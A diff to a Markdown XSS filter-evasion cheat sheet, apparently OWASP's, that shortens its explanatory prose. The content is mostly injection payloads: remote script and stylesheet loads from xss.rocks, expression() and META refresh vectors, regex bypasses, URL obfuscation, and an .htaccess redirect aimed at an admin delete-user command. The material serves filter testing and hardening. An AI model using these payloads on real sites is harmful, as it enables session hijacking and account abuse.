@@ -438,7 +440,7 @@ The [Dottoro Web Reference](http://help.dottoro.com/) also has a nice [list of e
 
 ### Remote style sheet
 
-Using something as simple as a remote style sheet you can include your XSS as the style parameter can be redefined using an embedded expression. This only works in IE. Notice that there is nothing on the page to show that there is included JavaScript. Note: With all of these remote style sheet examples they use the body tag, so it won't work unless there is some content on the page other than the vector itself, so you'll need to add a single letter to the page to make it work if it's an otherwise blank page:
+Remote style sheet can include XSS since style parameter can be redefined using embedded expression. Works only in IE. Nothing on page shows included JavaScript. Note: all remote style sheet examples use body tag → won't work unless page has content other than vector; add single letter to otherwise blank page:
 
 ```html
 <LINK REL="stylesheet" HREF="http://xss.rocks/xss.css">
@@ -446,8 +448,7 @@ Using something as simple as a remote style sheet you can include your XSS as th
 
 #### Remote style sheet part 2
 
-This works the same as above, but uses a `<STYLE>` tag instead of a `<LINK>` tag). A slight variation on this vector was used
-to hack Google Desktop. As a side note, you can remove the end `</STYLE>` tag if there is HTML immediately after the vector to close it. This is useful if you cannot have either an equals sign or a slash in your cross site scripting attack, which has come up at least once in the real world:
+Same as above but `<STYLE>` tag instead of `<LINK>` tag. Slight variation used to hack Google Desktop. Can remove end `</STYLE>` tag if HTML immediately follows vector to close it. Useful when neither equals sign nor slash allowed in XSS attack (came up at least once in real world):
 
 ```html
 <STYLE>@import'http://xss.rocks/xss.css';</STYLE>
@@ -455,7 +456,7 @@ to hack Google Desktop. As a side note, you can remove the end `</STYLE>` tag if
 
 #### Remote style sheet part 3
 
-This only works in Gecko rendering engines and works by binding an XUL file to the parent page.
+Works only in Gecko rendering engines; binds XUL file to parent page.
 
 ```html
 <STYLE>BODY{-moz-binding:url("http://xss.rocks/xssmoz.xml#xss")}</STYLE>
@@ -479,7 +480,7 @@ This XSS at times sends IE into an infinite loop of alerts:
 
 ### IMG STYLE with Expressions
 
-This is really a hybrid of the last two XSS vectors, but it really does show how hard STYLE tags can be to parse apart. This can send IE into a loop:
+Hybrid of last two XSS vectors; shows how hard STYLE tags are to parse apart. Can send IE into loop:
 
 ```html
 exp/*<A STYLE='no\xss:noxss("*//*");
@@ -501,7 +502,7 @@ xss:ex/*XSS*//*/*/pression(alert("XSS"))'>
 
 ### Anonymous HTML with STYLE Attribute
 
-The IE rendering engine doesn't really care if the HTML tag you build exists or not, as long as it starts with an open angle bracket and a letter:
+IE rendering engine doesn't care whether built HTML tag exists, as long as it starts with open angle bracket and letter:
 
 ```html
 <XSS STYLE="xss:expression(alert('XSS'))">
@@ -509,7 +510,7 @@ The IE rendering engine doesn't really care if the HTML tag you build exists or 
 
 ### Local htc File
 
-This is a little different than the last two XSS vectors because it uses an .htc file that must be on the same server as the XSS vector. This example file works by pulling in the JavaScript and running it as part of the style attribute:
+Differs from last two vectors: uses .htc file that must be on same server as XSS vector. Example file pulls in JavaScript and runs it as part of style attribute:
 
 ```html
 <XSS STYLE="behavior: url(xss.htc);">
@@ -517,7 +518,7 @@ This is a little different than the last two XSS vectors because it uses an .htc
 
 ### US-ASCII Encoding
 
-This attack uses malformed ASCII encoding with 7 bits instead of 8. This XSS method may bypass many content filters but it only works if the host transmits in US-ASCII encoding or if you set the encoding yourself. This is more useful against web application firewall (WAF) XSS evasion than it is server side filter evasion. Apache Tomcat is the only known server that by default still transmits in US-ASCII encoding.
+Uses malformed ASCII encoding with 7 bits instead of 8. May bypass many content filters but works only if host transmits in US-ASCII encoding or you set encoding yourself. More useful against web application firewall (WAF) XSS evasion than server side filter evasion. Apache Tomcat = only known server still transmitting US-ASCII by default.
 
 ```js
 ¼script¾alert(¢XSS¢)¼/script¾
@@ -525,7 +526,7 @@ This attack uses malformed ASCII encoding with 7 bits instead of 8. This XSS met
 
 ### META
 
-The odd thing about meta refresh is that it doesn't send a referrer in the header - so it can be used for certain types of attacks where you need to get rid of referring URLs:
+Meta refresh sends no referrer in header → usable for attacks needing no referring URLs:
 
 ```html
 <META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
@@ -533,7 +534,7 @@ The odd thing about meta refresh is that it doesn't send a referrer in the heade
 
 #### META using Data
 
-Directive URL scheme. This attack method is nice because it also doesn't have anything visible that has the word SCRIPT or the JavaScript directive in it, because it utilizes base64 encoding. Please see [RFC 2397](https://datatracker.ietf.org/doc/html/rfc2397) for more details.
+Directive URL scheme. Nothing visible contains word SCRIPT or JavaScript directive (uses base64 encoding). See RFC 2397.
 
 ```html
 <META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
@@ -541,7 +542,7 @@ Directive URL scheme. This attack method is nice because it also doesn't have an
 
 #### META with Additional URL Parameter
 
-If the target website attempts to see if the URL contains `<http://>;` at the beginning you can evade this filter rule with the following technique:
+Target website checks whether URL starts with `<http://>;` → evade filter rule with:
 
 ```html
 <META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">
@@ -551,7 +552,7 @@ If the target website attempts to see if the URL contains `<http://>;` at the be
 
 ### IFRAME
 
-If iFrames are allowed there are a lot of other XSS problems as well:
+iFrames allowed → many other XSS problems:
 
 ```html
 <IFRAME SRC="javascript:alert('XSS');"></IFRAME>
@@ -599,17 +600,17 @@ Just like above, TD's are vulnerable to BACKGROUNDs containing JavaScript XSS ve
 
 #### DIV Background-image with Unicode XSS Exploit
 
-This has been modified slightly to obfuscate the URL parameter:
+Slightly modified to obfuscate URL parameter:
 
 ```html
 <DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
 ```
 
-(Original vulnerability was found by Renaud Lifchitz as a vulnerability in Hotmail)
+(Original vulnerability found by Renaud Lifchitz in Hotmail)
 
 #### DIV Background-image Plus Extra Characters
 
-RSnake built a quick XSS fuzzer to detect any erroneous characters that are allowed after the open parenthesis but before the JavaScript directive in IE. These are in decimal but you can include hex and add padding of course. (Any of the following chars can be used: 1-32, 34, 39, 160, 8192-8.13, 12288, 65279):
+RSnake built quick XSS fuzzer detecting erroneous characters allowed after open parenthesis but before JavaScript directive in IE. In decimal but hex and padding includable. (Allowed chars: 1-32, 34, 39, 160, 8192-8.13, 12288, 65279):
 
 ```html
 <DIV STYLE="background-image: url(javascript:alert('XSS'))">
@@ -617,7 +618,7 @@ RSnake built a quick XSS fuzzer to detect any erroneous characters that are allo
 
 #### DIV Expression
 
-A variant of this attack was effective against a real-world XSS filter by using a newline between the colon and `expression`:
+Variant effective against real-world XSS filter using newline between colon and `expression`:
 
 ```html
 <DIV STYLE="width: expression(alert('XSS'));">
@@ -625,7 +626,7 @@ A variant of this attack was effective against a real-world XSS filter by using 
 
 ### Downlevel-Hidden Block
 
-Only works on the IE rendering engine - Trident. Some websites consider anything inside a comment block to be safe and therefore does not need to be removed, which allows our XSS vector to exist. Or the system might try to add comment tags around something in a vain attempt to render it harmless. As we can see, that probably wouldn't do the job:
+Only works on IE rendering engine, Trident. Some websites consider anything inside comment block safe, not needing removal → XSS vector survives. Or system adds comment tags around something in vain attempt to render harmless; likely ineffective:
 
 ```js
 <!--[if gte IE 4]>
@@ -635,7 +636,7 @@ Only works on the IE rendering engine - Trident. Some websites consider anything
 
 ### BASE Tag
 
-(Works on IE in safe mode) This attack needs the `//` to comment out the next characters so you won't get a JavaScript error and your XSS tag will render. Also, this relies on the fact that many websites uses dynamically placed images like `images/image.jpg` rather than full paths. If the path includes a leading forward slash like `/images/image.jpg`, you can remove one slash from this vector (as long as there are two to begin the comment this will work):
+(Works on IE in safe mode) Needs `//` to comment out next characters so no JavaScript error and XSS tag renders. Relies on many websites using dynamically placed images like `images/image.jpg` not full paths. Path with leading forward slash like `/images/image.jpg` → remove one slash from vector (works as long as two begin the comment):
 
 ```html
 <BASE HREF="javascript:alert('XSS');//">
@@ -643,7 +644,7 @@ Only works on the IE rendering engine - Trident. Some websites consider anything
 
 ### OBJECT Tag
 
-If the system allows objects, you can also inject virus payloads that can infect the users, etc with the APPLET tag. The linked file is actually an HTML file that can contain your XSS:
+System allows objects → can also inject virus payloads infecting users, etc. with APPLET tag. Linked file is HTML file that can contain XSS:
 
 ```html
 <OBJECT TYPE="text/x-scriptlet" DATA="http://xss.rocks/scriptlet.html"></OBJECT>
@@ -670,7 +671,7 @@ This XSS attack works only in IE:
 
 ### Locally hosted XML with embedded JavaScript that is generated using an XML data island
 
-This attack is nearly the same as above, but instead it refers to a locally hosted (on the same server) XML file that will hold your XSS vector. You can see the result here:
+Nearly same as above, but refers to locally hosted (same server) XML file holding XSS vector. Result:
 
 ```html
 <XML SRC="xsstest.xml" ID=I></XML>
@@ -679,7 +680,7 @@ This attack is nearly the same as above, but instead it refers to a locally host
 
 ### HTML+TIME in XML
 
-This attack only works in IE and remember that you need to be between HTML and BODY tags for this to work:
+Works only in IE; must be between HTML and BODY tags:
 
 ```html
 <HTML><BODY>
@@ -703,7 +704,7 @@ This attack allows you to rename your JavaScript file to an image as an XSS vect
 
 ### SSI (Server Side Includes)
 
-This requires SSI to be installed on the server to use this XSS vector. I probably don't need to mention this, but if you can run commands on the server there are no doubt much more serious issues:
+Requires SSI installed on server. If you can run commands on server, much more serious issues exist:
 
 ```js
 <!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://xss.rocks/xss.js></SCRIPT>'"-->
@@ -711,7 +712,7 @@ This requires SSI to be installed on the server to use this XSS vector. I probab
 
 ### PHP
 
-This attack requires PHP to be installed on the server. Again, if you can run any scripts remotely like this, there are probably much more dire issues:
+Requires PHP installed on server. Again, if you can run scripts remotely like this, probably much more dire issues:
 
 ```php
 <? echo('<SCR)';
@@ -720,7 +721,7 @@ echo('IPT>alert("XSS")</SCRIPT>'); ?>
 
 ### IMG Embedded Commands
 
-This attack only works when this is injected (like a web-board) in a web page behind password protection and that password protection works with other commands on the same domain. This can be used to delete users, add users (if the user who visits the page is an administrator), send credentials elsewhere, etc. This is one of the lesser used but more useful XSS vectors:
+Works only when injected (e.g. web-board) in web page behind password protection that works with other commands on same domain. Can delete users, add users (if visitor is administrator), send credentials elsewhere, etc. One of lesser used but more useful XSS vectors:
 
 ```html
 <IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">
@@ -728,7 +729,7 @@ This attack only works when this is injected (like a web-board) in a web page be
 
 #### IMG Embedded Commands part II
 
-This is more scary because there are absolutely no identifiers that make it look suspicious other than it is not hosted on your own domain. The vector uses a 302 or 304 (others work too) to redirect the image back to a command. So a normal `<IMG SRC="httx://badguy.com/a.jpg">` could actually be an attack vector to run commands as the user who views the image link. Here is the `.htaccess` (under Apache) line to accomplish the vector:
+More scary: nothing looks suspicious except image not hosted on your own domain. Vector uses 302 or 304 (others work too) to redirect image back to command. Normal `<IMG SRC="httx://badguy.com/a.jpg">` could be attack vector running commands as user viewing image link. `.htaccess` (Apache) line for vector:
 
 ```log
 Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser
@@ -738,7 +739,7 @@ Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser
 
 ### Cookie Manipulation
 
-This method is pretty obscure but there are a few examples where `<META` is allowed and it can be used to overwrite cookies. There are other examples of sites where instead of fetching the username from a database it is stored inside of a cookie to be displayed only to the user who visits the page. With these two scenarios combined you can modify the victim's cookie which will be displayed back to them as JavaScript (you can also use this to log people out or change their user states, get them to log in as you, etc):
+Obscure, but some cases allow `<META` and it can overwrite cookies. Some sites store username in cookie to display only to visiting user, instead of fetching from database. Combined: modify victim's cookie, displayed back as JavaScript (also usable to log people out, change user states, make them log in as you, etc):
 
 ```html
 <META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('XSS')</SCRIPT>">
@@ -746,41 +747,43 @@ This method is pretty obscure but there are a few examples where `<META` is allo
 
 ### XSS Using HTML Quote Encapsulation
 
-This attack was originally tested in IE so your mileage may vary. For performing XSS on sites that allow `<SCRIPT>` but don't allow `<SCRIPT SRC...` by way of a regex filter `/\<script\[^\>\]+src/i`, do the following:
+Originally tested in IE; mileage may vary. XSS on sites allowing `<SCRIPT>` but not `<SCRIPT SRC...` via regex filter `/\<script\[^\>\]+src/i`:
 
 ```html
 <SCRIPT a=">" SRC="httx://xss.rocks/xss.js"></SCRIPT>
 ```
 
-If you are performing XSS on sites that allow `<SCRIPT>` but don't allow `\<script src...` due to a regex filter that does `/\<script((\\s+\\w+(\\s\*=\\s\*(?:"(.)\*?"|'(.)\*?'|\[^'"\>\\s\]+))?)+\\s\*|\\s\*)src/i` (This is an important one, because this regex has been seen in the wild):
+XSS on sites allowing `<SCRIPT>` but not `\<script src...` due to regex filter `/\<script((\\s+\\w+(\\s\*=\\s\*(?:"(.)\*?"|'(.)\*?'|\[^'"\>\\s\]+))?)+\\s\*|\\s\*)src/i` (important: regex seen in the wild):
 
 ```html
 <SCRIPT =">" SRC="httx://xss.rocks/xss.js"></SCRIPT>
 ```
 
-Another XSS to evade the same filter: `/\<script((\\s+\\w+(\\s\*=\\s\*(?:"(.)\*?"|'(.)\*?'|\[^'"\>\\s\]+))?)+\\s\*|\\s\*)src/i`:
+Another evasion of same filter: `/\<script((\\s+\\w+(\\s\*=\\s\*(?:"(.)\*?"|'(.)\*?'|\[^'"\>\\s\]+))?)+\\s\*|\\s\*)src/i`:
 
 ```html
 <SCRIPT a=">" '' SRC="httx://xss.rocks/xss.js"></SCRIPT>
 ```
 
-Yet another XSS that evades the same filter: `/\<script((\\s+\\w+(\\s\*=\\s\*(?:"(.)\*?"|'(.)\*?'|\[^'"\>\\s\]+))?)+\\s\*|\\s\*)src/i`
+Yet another evasion of same filter: `/\<script((\\s+\\w+(\\s\*=\\s\*(?:"(.)\*?"|'(.)\*?'|\[^'"\>\\s\]+))?)+\\s\*|\\s\*)src/i`
 
-Generally, we are not discussing mitigation techniques, but the only thing that stops this XSS example is, if you still want to allow `<SCRIPT>` tags but not remote script is a state machine (and of course there are other ways to get around this if they allow `<SCRIPT>` tags), use this:
+Mitigation not generally discussed, but only a state machine stops this XSS example if `<SCRIPT>` tags still allowed but not remote script (other bypasses exist if `<SCRIPT>` tags allowed), use this:
 
 ```html
 <SCRIPT "a='>'" SRC="httx://xss.rocks/xss.js"></SCRIPT>
 ```
 
-And one last XSS attack to evade, `/\<script((\\s+\\w+(\\s\*=\\s\*(?:"(.)\*?"|'(.)\*?'|\[^'"\>\\s\]+))?)+\\s\*|\\s\*)src/i` using grave accents (again, doesn't work in Firefox):
+Last evasion of `/\<script((\\s+\\w+(\\s\*=\\s\*(?:"(.)\*?"|'(.)\*?'|\[^'"\>\\s\]+))?)+\\s\*|\\s\*)src/i` using grave accents (doesn't work in Firefox):
 
 <!-- markdownlint-disable MD038-->
+
 ```html
 <SCRIPT a=`>` SRC="httx://xss.rocks/xss.js"></SCRIPT>
 ```
+
 <!-- markdownlint-enable MD038-->
 
-Here's an XSS example which works if the regex won't catch a matching pair of quotes but instead will find any quotes to terminate a parameter string improperly:
+Works if regex doesn't catch matching pair of quotes but finds any quotes to terminate parameter string improperly:
 
 ```html
 <SCRIPT a=">'>" SRC="httx://xss.rocks/xss.js"></SCRIPT>
@@ -794,7 +797,7 @@ This XSS still worries me, as it would be nearly impossible to stop this without
 
 ### URL String Evasion
 
-The following attacks work if `http://www.google.com/` is programmatically disallowed:
+Work if `http://www.google.com/` programmatically disallowed:
 
 #### IP Versus Hostname
 
@@ -810,7 +813,7 @@ The following attacks work if `http://www.google.com/` is programmatically disal
 
 #### DWORD Encoding
 
-Note: there are other of variations of DWORD encoding - see the IP Obfuscation calculator below for more details:
+Note: other DWORD encoding variations exist; see IP Obfuscation calculator below.
 
 ```html
 <A HREF="http://1113982867/">XSS</A>
@@ -818,7 +821,7 @@ Note: there are other of variations of DWORD encoding - see the IP Obfuscation c
 
 #### Hex Encoding
 
-The total size of each number allowed is somewhere in the neighborhood of 240 total characters as you can see on the second digit, and since the hex number is between 0 and F the leading zero on the third hex quote is not required:
+Total size of each allowed number ~240 total characters (see second digit); hex number between 0 and F → leading zero on third hex quote not required:
 
 ```html
 <A HREF="http://0x42.0x0000066.0x7.0x93/">XSS</A>
@@ -826,7 +829,7 @@ The total size of each number allowed is somewhere in the neighborhood of 240 to
 
 #### Octal Encoding
 
-Again padding is allowed, although you must keep it above 4 total characters per class - as in class A, class B, etc:
+Padding allowed, but keep above 4 total characters per class (class A, class B, etc):
 
 ```html
 <A HREF="http://0102.0146.0007.00000223/">XSS</A>
@@ -840,18 +843,18 @@ Again padding is allowed, although you must keep it above 4 total characters per
 
 #### Mixed Encoding
 
-Let's mix and match base encoding and throw in some tabs and newlines (why browsers allow this, I'll never know). The tabs and newlines only work if this is encapsulated with quotes:
+Mix base encodings, add tabs and newlines (why browsers allow this, unknown). Tabs and newlines work only if encapsulated with quotes:
 
-<!-- markdownlint-disable MD010-->
 ```html
 <A HREF="h
 tt  p://6	6.000146.0x7.147/">XSS</A>
 ```
+
 <!-- markdownlint-enable MD010-->
 
 #### Protocol Resolution Bypass
 
-`//` translates to `http://`, which saves a few more bytes. This is really handy when space is an issue too (two less characters can go a long way) and can easily bypass regex like `(ht|f)tp(s)?://` (thanks to Ozh for part of this one). You can also change the `//` to `\\\\`. You do need to keep the slashes in place, however, otherwise this will be interpreted as a relative path URL:
+`//` translates to `http://`, saving a few bytes. Handy when space is an issue (two less characters go a long way); easily bypasses regex like `(ht|f)tp(s)?://` (thanks to Ozh for part of this one). `//` can also change to `\\\\`. Keep slashes in place, else interpreted as relative path URL:
 
 ```html
 <A HREF="//www.google.com/">XSS</A>
@@ -859,7 +862,7 @@ tt  p://6	6.000146.0x7.147/">XSS</A>
 
 #### Removing CNAMEs
 
-When combined with the above URL, removing `www.` will save an additional 4 bytes for a total byte savings of 9 for servers that have set this up properly:
+Combined with above URL, removing `www.` saves additional 4 bytes, total 9 bytes saved for servers set up properly:
 
 ```html
 <A HREF="http://google.com/">XSS</A>
@@ -880,7 +883,7 @@ Extra dot for absolute DNS:
 #### Content Replace as Attack Vector
 
 <!-- markdownlint-disable MD010-->
-Assuming `http://www.google.com/` is programmatically replaced with nothing. A similar attack vector has been used against several separate real world XSS filters by using the conversion filter itself (here is an example) to help create the attack vector `java&\#x09;script:` was converted into `java	script:`, which renders in IE:
+`http://www.google.com/` programmatically replaced with nothing. Similar vector used against several real world XSS filters, using conversion filter itself to create vector (example): `java&\#x09;script:` converted into `java	script:`, which renders in IE:
 <!-- markdownlint-enable MD010-->
 
 ```html
@@ -889,7 +892,7 @@ Assuming `http://www.google.com/` is programmatically replaced with nothing. A s
 
 ### Assisting XSS with HTTP Parameter Pollution
 
-If a content sharing flow on a web site is implemented as shown below, this attack will work. There is a `Content` page which includes some content provided by users and this page also includes a link to `Share` page which enables a user choose their favorite social sharing platform to share it on. Developers HTML encoded the `title` parameter in the `Content` page to prevent against XSS but for some reasons they didn't URL encoded this parameter to prevent from HTTP Parameter Pollution. Finally they decide that since `content_type`'s value is a constant and will always be integer, they didn't encode or validate the `content_type` in the `Share` page.
+Works if content sharing flow implemented as below. `Content` page includes user-provided content and link to `Share` page where user picks favorite social sharing platform. Developers HTML encoded `title` parameter in `Content` page against XSS but didn't URL encode it against HTTP Parameter Pollution. Also assumed `content_type` value constant and always integer → no encoding or validation of `content_type` in `Share` page.
 
 #### Content Page Source Code
 
@@ -911,7 +914,7 @@ var title = "<%=Encode.forJavaScript(request.getParameter("title"))%>";
 
 #### Content Page Output
 
-If attacker set the untrusted content title as `This is a regular title&content_type=1;alert(1)` the link in `Content` page would be this:
+Attacker sets untrusted content title `This is a regular title&content_type=1;alert(1)` → link in `Content` page:
 
 ```html
 <a href="/share?content_type=1&title=This is a regular title&amp;content_type=1;alert(1)">Share</a>
@@ -931,11 +934,11 @@ var title = "This is a regular title";
 </script>
 ```
 
-As a result, in this example the main flaw is trusting the content_type in the `Share` page without proper encoding or validation. HTTP Parameter Pollution could increase impact of the XSS flaw by promoting it from a reflected XSS to a stored XSS.
+Main flaw here: trusting content_type in `Share` page without proper encoding or validation. HTTP Parameter Pollution could raise XSS impact from reflected to stored.
 
 ## Character Escape Sequences
 
-Here are all the possible combinations of the character `\<` in HTML and JavaScript. Most of these won't render out of the box, but many of them can get rendered in certain circumstances as seen above.
+All possible combinations of character `\<` in HTML and JavaScript. Most won't render out of the box; many render in certain circumstances as seen above.
 
 - `<`
 - `%3C`
@@ -1139,5 +1142,5 @@ The payload should include leading and trailing backticks:
 
 ## References
 
-- [MDN: Cross-Site Scripting (XSS)](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/XSS)
-- [CWE-79: Improper Neutralization of Input During Web Page Generation](https://cwe.mitre.org/data/definitions/79.html)
+- MDN: Cross-Site Scripting (XSS)
+- CWE-79: Improper Neutralization of Input During Web Page Generation
